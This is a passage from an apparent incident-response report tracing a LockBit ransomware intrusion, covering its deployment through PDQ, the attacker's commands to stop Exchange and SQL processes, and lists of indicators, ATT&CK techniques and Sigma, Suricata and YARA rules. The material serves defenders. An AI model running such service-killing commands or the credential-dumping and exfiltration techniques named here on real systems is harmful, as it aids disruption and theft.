<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_061.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42195" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_061.png" alt="" width="1660" height="425" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_061.png 1660w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_061-300x77.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_061-1024x262.png 1024w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_061-768x197.png 768w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_061-1536x393.png 1536w" sizes="auto, (max-width: 1660px) 100vw, 1660px" /></a></p>





<p>Several runs of the deployment package by the threat actor:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_062.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42194" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_062.png" alt="" width="1841" height="173" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_062.png 1841w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_062-300x28.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_062-1024x96.png 1024w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_062-768x72.png 768w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_062-1536x144.png 1536w" sizes="auto, (max-width: 1841px) 100vw, 1841px" /></a></p>





<p>Several ways to attempt to execute the ransomware including calling the file, command arguments, and finally the batch file:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_063.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42193" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_063.png" alt="" width="1551" height="273" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_063.png 1551w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_063-300x53.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_063-1024x180.png 1024w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_063-768x135.png 768w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_063-1536x270.png 1536w" sizes="auto, (max-width: 1551px) 100vw, 1551px" /></a></p>





<p>Once the threat actor started the deployment we observed both PDQ service runners and the package files (ransomware and batch file) being deployed over SMB.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_064.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42192" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_064.png" alt="" width="1876" height="1125" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_064.png 1876w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_064-300x180.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_064-1024x614.png 1024w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_064-768x461.png 768w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_064-1536x921.png 1536w" sizes="auto, (max-width: 1876px) 100vw, 1876px" /></a></p>





<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_065.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42191" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_065.png" alt="" width="1542" height="764" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_065.png 1542w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_065-300x149.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_065-1024x507.png 1024w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_065-768x381.png 768w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_065-1536x761.png 1536w" sizes="auto, (max-width: 1542px) 100vw, 1542px" /></a></p>



<p>This batch file was then executed on hosts across the environment via the PDQ runner.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_066.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42190" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_066.png" alt="" width="1422" height="113" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_066.png 1422w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_066-300x24.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_066-1024x81.png 1024w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_066-768x61.png 768w" sizes="auto, (max-width: 1422px) 100vw, 1422px" /></a></p>





<p>After completing the deployment using PDQ, the threat actor connected to an Exchange server using RDP. They issued a few commands to stop running processes associated with Exchange and SQL on the server:</p>
<pre>process net stop MSExchangeUM<br />process taskkill /f /im sql*</pre>



<p>They then dropped a batch file, test.bat, which contained a list of the systems found earlier during the intrusion, as well as a ransomware execution command. This appears to have been a backup to try and hit systems that may have been missed during the PDQ deployment.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_067.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42189" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_067.png" alt="" width="1588" height="909" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_067.png 1588w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_067-300x172.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_067-1024x586.png 1024w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_067-768x440.png 768w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_067-1536x879.png 1536w" sizes="auto, (max-width: 1588px) 100vw, 1588px" /></a></p>





<p>Below is an extract of the test.bat contents:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_068.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42188" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_068.png" alt="" width="1032" height="777" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_068.png 1032w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_068-300x226.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_068-1024x771.png 1024w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_068-768x578.png 768w" sizes="auto, (max-width: 1032px) 100vw, 1032px" /></a></p>





<p>After the ransomware attack was completed, the affected files were renamed with the .rhddiicoE extension, and a ransom note titled rhddiicoE.README.txt was left on the compromised hosts.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_069.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42187" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_069.png" alt="" width="1056" height="1066" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_069.png 1056w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_069-297x300.png 297w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_069-1014x1024.png 1014w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_069-150x150.png 150w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_069-768x775.png 768w" sizes="auto, (max-width: 1056px) 100vw, 1056px" /></a></p>





<p>Additionally, the desktop background image was modified as part of the ransomware execution.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_070.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42186" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_070.png" alt="" width="1837" height="677" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_070.png 1837w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_070-300x111.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_070-1024x377.png 1024w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_070-768x283.png 768w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_070-1536x566.png 1536w" sizes="auto, (max-width: 1837px) 100vw, 1837px" /></a></p>





<h2 id="timeline" class="wp-block-heading"><a href="#timeline">Timeline</a></h2>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_071.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42185" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_071.png" alt="" width="2450" height="3040" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_071.png 2450w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_071-242x300.png 242w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_071-825x1024.png 825w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_071-768x953.png 768w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_071-1238x1536.png 1238w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_071-1651x2048.png 1651w" sizes="auto, (max-width: 2450px) 100vw, 2450px" /></a></p>





<h2 id="diamond-model" class="wp-block-heading"><a href="#diamond-model">Diamond Model</a></h2>





<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_072.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42184" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_072.png" alt="" width="3756" height="1638" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_072.png 3756w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_072-300x131.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_072-1024x447.png 1024w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_072-768x335.png 768w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_072-1536x670.png 1536w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_072-2048x893.png 2048w" sizes="auto, (max-width: 3756px) 100vw, 3756px" /></a></p>
<h2 id="indicators" class="wp-block-heading"><a href="#indicators">Indicators</a></h2>



<h3 class="wp-block-heading">Atomic</h3>



<pre class="wp-block-preformatted">92[.]51.2.22
92[.]51.2.27
</pre>



<h3 class="wp-block-heading">Computed</h3>



<pre class="wp-block-preformatted">asd.bat
438448FDC7521ED034F6DABDF814B6BA
F08E7343A94897ADEAE78138CC3F9142ED160A03
1E2E25A996F72089F12755F931E7FCA9B64DD85B03A56A9871FD6BB8F2CF1DBB

netscan.exe
D7ADDB5B6F55EAB1686410A17B3C867B
A54AF16B2702FE0E5C569F6D8F17574A9FDAF197
498BA0AFA5D3B390F852AF66BD6E763945BF9B6BFF2087015ED8612A18372155

test.bat
9D495530A421A7C7E113B7AFC3A50504
02D291E2FF5799A13EACC72AD0758F2C5E69D414
594F2F8AB05F88F765D05EB1CF24E4C697746905A61ED04A6FC2B744DD6FEBB0

Veeam-Get-Creds-New.ps1
3BD63B2962D41D2E29E570238D28EC0E
9537E1C4E5DDD7FB9B98C532CA89A9DB08262AB4
7AA8E510B9C3B5D39F84E4C2FA68C81DA888E091436FDB7FEE276EE7FF87F016
</pre>



<h3 class="wp-block-heading">Behavioral</h3>



<pre class="wp-block-preformatted">LSASS Memory - T1003.001
System Network Configuration Discovery - T1016
Remote System Discovery - T1018
Remote Desktop Protocol - T1021.001
System Owner/User Discovery - T1033
Network Service Discovery - T1046
Process Discovery - T1057
PowerShell - T1059.001
Windows Command Shell - T1059.003
Clear Windows Event Logs - T1070.001
Software Deployment Tools - T1072
Ingress Tool Transfer - T1105
Exploit Public-Facing Application - T1190
System Binary Proxy Execution: Mshta - T1218.005
Remote Access Software - T1219
Data Encrypter for Impact - T1486
Credentials In Files - T1552.001
Exfiltration to Cloud Storage - T1567.002
Create or Modify System Process: Windows Service - T1543.003
Valid Accounts: Local Accounts - T1078.003
</pre>



<h2 id="detections" class="wp-block-heading"><a href="#detections">Detections</a></h2>



<h3 class="wp-block-heading">Network</h3>



<pre class="wp-block-preformatted">ET ATTACK_RESPONSE PowerShell Base64 Encoded Content Command Common In Powershell Stagers M1
ET ATTACK_RESPONSE PowerShell NoProfile Command Received In Powershell Stagers
ET EXPLOIT Atlassian Confluence RCE Attempt Observed (CVE-2023-22527) M1
ET EXPLOIT MSXMLHTTP Download of HTA (Observed in CVE-2017-0199)
ET EXPLOIT SUSPICIOUS Possible CVE-2017-0199 IE7/NoCookie/Referer HTA dl
ET HUNTING PE EXE Download over raw TCP
ET HUNTING PowerShell Hidden Window Command Common In Powershell Stagers M1
ET INFO Dotted Quad Host HTA Request
ET INFO User-Agent (python-requests) Inbound to Webserver
ET MALWARE Possible Metasploit Payload Common Construct Bind_API (from server)
ET POLICY Possible HTA Application Download
ET WEB_CLIENT HTA File containing Wscript.Shell Call - Potential CVE-2017-0199
ET WEB_CLIENT PowerShell call in script 1
ET WEB_CLIENT PowerShell call in script 2
ET WEB_SERVER Possible SQL Injection (exec) in HTTP Request Body
ET WEB_SERVER WebShell Generic - net user
ET WEB_SPECIFIC_APPS Atlassian Confluence CVE-2023-22515 Vulnerable Server Detected M1
ET WEB_SPECIFIC_APPS Atlassian Confluence CVE-2023-22515 Vulnerable Server Detected M2
ET WEB_SPECIFIC_APPS Atlassian Confluence CVE-2023-22518 Vulnerable Server Detected Version 8.x M1
ET WEB_SPECIFIC_APPS Atlassian Confluence CVE-2023-22518 Vulnerable Server Detected Version 8.x M2
ETPRO ATTACK_RESPONSE Possibly Malicious VBScript Executing WScript.Shell Run M1
ETPRO HUNTING Observed Suspicious Base64 Encoded Wide String Inbound (zip)
ETPRO HUNTING Suspicious Offset PE EXE or DLL Download on Non-Standard Ports
ETPRO MALWARE Possible Malicious VBScript calling PowerShell over HTTP
ETPRO MALWARE Possible Malicious VBScript calling PowerShell over HTTP 1 M2
</pre>



<h3 class="wp-block-heading">Sigma</h3>



<p>Search rules on <a href="https://detection.fyi/" target="_blank" rel="noreferrer noopener">detection.fyi</a> or <a href="https://sigmasearchengine.com/" target="_blank" rel="noreferrer noopener">sigmasearchengine.com</a></p>



<p>DFIR Public Rules Repo:</p>



<pre class="wp-block-preformatted">8a0d153f-b4e4-4ea7-9335-892dfbe17221  :  NetScan Share Enumeration Write Access Check
</pre>



<p>DFIR Private Rules:</p>



<pre class="wp-block-preformatted">1aafd4cc-cb38-498b-9365-394f71fd872c  :  Veeam Credential Dumping Script (PSH)
8a64fe8d-e9d5-4c8c-9716-0ceed9b3b791  :  Notepad Password Files Discovery
b878e8c2-bfa5-4b1d-8868-a798f57d197a  :  Veeam Credential Dumping Script Execution
53c4b596-8af3-42f3-a974-bddfbf6db731  :  Wevtutil.exe Log Clearing Process Execution
516c6fbc-949a-4aa7-8727-c041aee56dc0  :  Execution of Remote HTA File via mshta.exe
8a64fe8d-e9d5-4c8c-9716-0ceed9b3b791  :  Notepad Password Files Discovery
3a9897de-164a-4b5a-8995-ffdc301d6f6d  :  Confluence Executing Suspicious Commands
7019b8b4-d23e-4d35-b5fa-192ffb8cb3ee  :  Use of Rclone to exfiltrate data over an SSH channel
62047536-b23d-4aef-af94-b6095aea1617  :  Data Exfiltration Using Rclone with Cloud Storage
</pre>



<p>Sigma Repo:</p>



<pre class="wp-block-preformatted">cd951fdc-4b2f-47f5-ba99-a33bf61e3770	:	Always Install Elevated Windows Installer
e32d4572-9826-4738-b651-95fa63747e8a	:	Base64 Encoded PowerShell Command Detected
7d9263bd-dc47-4a58-bc92-5474abab390c	:	Change Winevt Channel Access Permission Via Registry
2f78da12-f7c7-430b-8b19-a28f269b77a3	: 	Disable Windows Event Logging Via Registry
fcddca7c-b9c0-4ddf-98da-e1e2d18b0157	:	Disabled Windows Defender Eventlog
61065c72-5d7d-44ef-bf41-6a36684b545f	:	Elevated System Shell Spawned
98767d61-b2e8-4d71-b661-e36783ee24c1	:	Gzip Archive Decode Via PowerShell
a642964e-bead-4bed-8910-1bb4d63e3b4d	:	HackTool - Mimikatz Execution
502b42de-4306-40b4-9596-6f590c81f073	:	Local Accounts Discovery
f26c6093-6f14-4b12-800f-0fcb46f5ffd0	:	Malicious Base64 Encoded PowerShell Keywords in Command Lines
183e7ea8-ac4b-4c23-9aec-b3dac4e401ac	:	Net.EXE Execution
cd219ff3-fa99-45d4-8380-a7d15116c6dc	:	New User Created Via Net.EXE
f4bbd493-b796-416e-bbf2-121235348529	:	Non Interactive PowerShell Process Spawned
d679950c-abb7-43a6-80fb-2a480c4fc450	:	PDQ Deploy Remote Adminstartion Tool Execution
d7bcd677-645d-4691-a8d4-7a5602b780d1	:	Potential PowerShell Command Line Obfuscation
8e0bb260-d4b2-4fff-bb8d-3f82118e6892	:	Potentially Suspicious CMD Shell Output Redirect
fdb62a13-9a81-4e5c-a38f-ea93a16f6d7c	:	PowerShell Base64 Encoded FromBase64String Cmdlet
3b6ab547-8ec2-4991-b9d2-2b06702a48d7	:	PowerShell Download Pattern
6e897651-f157-4d8f-aaeb-df8151488385	:	PowerShell Web Download
86085955-ea48-42a2-9dd3-85d4c36b167d	:	Process Terminated Via Taskkill
b52e84a3-029e-4529-b09b-71d19dd27e94	:	Remote Access Tool - AnyDesk Execution
b98d0db6-511d-45de-ad02-e82a98729620	:	Remotely Hosted HTA File Executed Via Mshta.EXE
2aa0a6b4-a865-495b-ab51-c28249537b75	:	Startup Folder File Write
88872991-7445-4a22-90b2-a3adadb0e827	:	Stop Windows Service Via Net.EXE
590a5f4c-6c8c-4f10-8307-89afe9453a9d	:	Suspicious Child Process Created as System
7be5fb68-f9ef-476d-8b51-0256ebece19e	:	Suspicious Execution of Hostname
fb843269-508c-4b76-8b8d-88679db22ce7	:	Suspicious Execution of Powershell with Base64
5cb299fc-5fb1-4d07-b989-0644c68b6043	:	Suspicious File Download From IP Via Curl.EXE
d75d6b6b-adb9-48f7-824b-ac2e786efe1f	:	Suspicious FromBase64String Usage On Gzip Archive - Process Creation
03cc0c25-389f-4bf8-b48d-11878079f1ca	:	Suspicious MSHTA Child Process
754ed792-634f-40ae-b3bc-e0448d33f695	:	Suspicious PowerShell Parent Process
2617e7ed-adb7-40ba-b0f3-8f9945fe6c09	:	Suspicious SYSTEM User Process Creation
63332011-f057-496c-ad8d-d2b6afb27f96	:	Suspicious Tasklist Discovery Command
ce72ef99-22f1-43d4-8695-419dcb5d9330	:	Suspicious Windows Service Tampering
d0d28567-4b9a-45e2-8bbc-fb1b66a1f7f6	:	Unusually Long PowerShell CommandLine
e28a5a99-da44-436d-b7a0-2afc20a5f413	:	Whoami Utility Execution
8de1cbe8-d6f5-496d-8237-5f44a721c7a0	:	Whoami.EXE Execution Anomaly
79ce34ca-af29-4d0e-b832-fc1b377020db	:	Whoami.EXE Execution From Privileged Process
671bb7e3-a020-4824-a00e-2ee5b55f385e	:	WMI Module Loaded By Uncommon Process
</pre>



<h3 class="wp-block-heading">Yara</h3>



<figure class="wp-block-embed">
<div><a href="https://github.com/The-DFIR-Report/Yara-Rules/blob/main/27244/27244.yar">https://github.com/The-DFIR-Report/Yara-Rules/blob/main/27244/27244.yar</a></div>
<div class="wp-block-embed__wrapper"><a href="https://github.com/The-DFIR-Report/Yara-Rules/blob/main/27138/27138.yar#L13" target="_blank" rel="noopener">https://github.com/The-DFIR-Report/Yara-Rules/blob/main/27138/27138.yar#L13</a></div>
</figure>
<div><a href="https://github.com/The-DFIR-Report/Yara-Rules/blob/main/27138/27138.yar#L46" target="_blank" rel="noopener">https://github.com/The-DFIR-Report/Yara-Rules/blob/main/27138/27138.yar#L46</a></div>



<pre class="wp-block-preformatted">BINARYALERT_Hacktool_Windows_Mimikatz_Copywrite
BINARYALERT_Hacktool_Windows_Mimikatz_Files
ELASTIC_Windows_Trojan_Metasploit_38B8Ceec
ELASTIC_Windows_Trojan_Metasploit_47F5D54A
ELASTIC_Windows_Trojan_Metasploit_4A1C4Da8
ELASTIC_Windows_Trojan_Metasploit_7Bc0F998
ELASTIC_Windows_Trojan_Metasploit_C9773203
GODMODERULES_IDDQD_God_Mode_Rule
SECUINFRA_SUSP_Powershell_Base64_Decode
SIGNATURE_BASE_MAL_RANSOM_Lockbit_Apr23_1
SIGNATURE_BASE_MAL_RANSOM_Lockbit_Forensicartifacts_Apr23_1
SIGNATURE_BASE_Msfpayloads_Msf_Ref
SIGNATURE_BASE_Powershell_Susp_Parameter_Combo
MAL_RANSOM_LockBit_Apr23_1
MAL_RANSOM_LockBit_ForensicArtifacts_Apr23_1
SIGNATURE_BASE_MAL_RANSOM_Lockbit_Apr23_1
SIGNATURE_BASE_MAL_RANSOM_Lockbit_Forensicartifacts_Apr23_1
ELASTIC_Windows_Ransomware_Lockbit_369E1E94
CRAIU_Crime_Lockbit3_Ransomware
</pre>



<h2 id="mitre" class="wp-block-heading"><a href="#mitre">MITRE ATT&amp;CK</a></h2>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_073.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42183" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_073.png" alt="" width="2436" height="2604" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_073.png 2436w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_073-281x300.png 281w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_073-958x1024.png 958w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_073-768x821.png 768w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_073-1437x1536.png 1437w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_073-1916x2048.png 1916w" sizes="auto, (max-width: 2436px) 100vw, 2436px" /></a></p>





<pre class="wp-block-preformatted">Clear Windows Event Logs - T1070.001
Create Account - T1136
Credentials In Files - T1552.001
Data Encrypted for Impact - T1486
Exfiltration to Cloud Storage - T1567.002
Exploit Public-Facing Application - T1190
Ingress Tool Transfer - T1105
LSASS Memory - T1003.001
Mshta - T1218.005
Network Service Discovery - T1046
PowerShell - T1059.001
Process Discovery - T1057
Remote Access Software - T1219
Remote Desktop Protocol - T1021.001
Remote System Discovery - T1018
Software Deployment Tools - T1072
System Network Configuration Discovery - T1016
System Owner/User Discovery - T1033
Windows Command Shell - T1059.003
Windows Service - T1543.003
</pre>



<p>Internal case #TB27244 #PR34716</p>
<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-42179" class="share-twitter sd-button share-icon" href="https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/?share=twitter" target="_blank" title="Click to share on Twitter" ><span>Twitter</span></a></li><li class="share-linkedin"><a rel="nofollow noopener noreferrer" data-shared="sharing-linkedin-42179" class="share-linkedin sd-button share-icon" href="https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/?share=linkedin" target="_blank" title="Click to share on LinkedIn" ><span>LinkedIn</span></a></li><li class="share-reddit"><a rel="nofollow noopener noreferrer" data-shared="" class="share-reddit sd-button share-icon" href="https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/?share=reddit" target="_blank" title="Click to share on Reddit" ><span>Reddit</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-42179" class="share-facebook sd-button share-icon" href="https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/?share=facebook" target="_blank" title="Click to share on Facebook" ><span>Facebook</span></a></li><li class="share-jetpack-whatsapp"><a rel="nofollow noopener noreferrer" data-shared="" class="share-jetpack-whatsapp sd-button share-icon" href="https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/?share=jetpack-whatsapp" target="_blank" title="Click to share on WhatsApp" ><span>WhatsApp</span></a></li><li class="share-end"></li></ul></div></div></div>
<div id='jp-relatedposts' class='jp-relatedposts' >
	<h3 class="jp-relatedposts-headline"><em>Related</em></h3>
</div>
	</div><!-- .entry-content -->

	
		<footer class="entry-footer">
			<div class="entry-meta">

							</div><!-- .entry-meta -->
		</footer><!-- .entry-footer -->
			
		</div><!-- .entry-content-holder -->
</article><!-- #post-42179 -->

	<nav class="navigation post-navigation" aria-label="Posts">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/" rel="prev">Cobalt Strike and a Pair of SOCKS Lead to LockBit Ransomware</a></div></div>
	</nav>
		</main><!-- #main -->
	</div><!-- #primary -->


<aside id="secondary" class="widget-area">
	<section id="search-4" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://thedfirreport.com/">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section><section id="google_translate_widget-5" class="widget widget_google_translate_widget"><div id="google_translate_element"></div></section><section id="block-7" class="widget widget_block">	<div class="wp-block-jetpack-subscriptions__supports-newline wp-block-jetpack-subscriptions">
		<div class="wp-block-jetpack-subscriptions__container is-not-subscriber">
							<form
					action="https://wordpress.com/email-subscriptions"
					method="post"
					accept-charset="utf-8"
					data-blog="175340963"
					data-post_access_level="everybody"
					data-subscriber_email=""
					id="subscribe-blog"
				>
					<div class="wp-block-jetpack-subscriptions__form-elements">
												<p id="subscribe-email">
							<label
								id="subscribe-field-label"
								for="subscribe-field"
								class="screen-reader-text"
							>
								Type your email…							</label>
							<input
									required="required"
									type="email"
									name="email"
									class="no-border-radius "
									style="font-size: 16px;padding: 15px 23px 15px 23px;border-radius: 0px;border-width: 1px;"
									placeholder="Type your email…"
									value=""
									id="subscribe-field"
									title="Please fill in this field."
								/>						</p>
												<p id="subscribe-submit"
													>
							<input type="hidden" name="action" value="subscribe"/>
							<input type="hidden" name="blog_id" value="175340963"/>
							<input type="hidden" name="source" value="https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/"/>
							<input type="hidden" name="sub-type" value="subscribe-block"/>
							<input type="hidden" name="app_source" value=""/>
							<input type="hidden" name="redirect_fragment" value="subscribe-blog"/>
							<input type="hidden" name="lang" value="en_US"/>
							<input type="hidden" id="_wpnonce" name="_wpnonce" value="3868da4bae" /><input type="hidden" name="_wp_http_referer" value="/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/" /><input type="hidden" name="post_id" value="42179"/>							<button type="submit"
																	class="wp-block-button__link no-border-radius"
																									style="font-size: 16px;padding: 15px 23px 15px 23px;margin: 0; margin-left: 10px;border-radius: 0px;border-width: 1px;"
																name="jetpack_subscriptions_widget"
							>
								Subscribe							</button>
						</p>
					</div>
				</form>
								</div>
	</div>
	</section><section id="block-21" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://the-dfir-report-store.myshopify.com/products/dfir-labs-ctf-july-6-16-00-20-00-utc"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1.png" alt="" class="wp-image-35571 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1.png 200w, https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1-150x150.png 150w" sizes="auto, (max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h4 class="wp-block-heading"><a href="https://the-dfir-report-store.myshopify.com/products/dfir-labs-ctf-july-6-16-00-20-00-utc">Register For Our Next CTF</a></h4>
</div></div>
</section><section id="block-8" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s.png" alt="" class="wp-image-21332 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s-150x150.png 150w" sizes="auto, (max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/" data-type="link" data-id="https://thedfirreport.com/">Reports</a></h3>
</div></div>
</section><section id="block-9" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/threat-intelligence/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s.png" alt="" class="wp-image-21334 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s-150x150.png 150w" sizes="auto, (max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></h3>
</div></div>
</section><section id="block-10" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/detection-rules/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s.png" alt="" class="wp-image-21336 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s-150x150.png 150w" sizes="auto, (max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></h3>
</div></div>
</section><section id="block-16" class="widget widget_block">
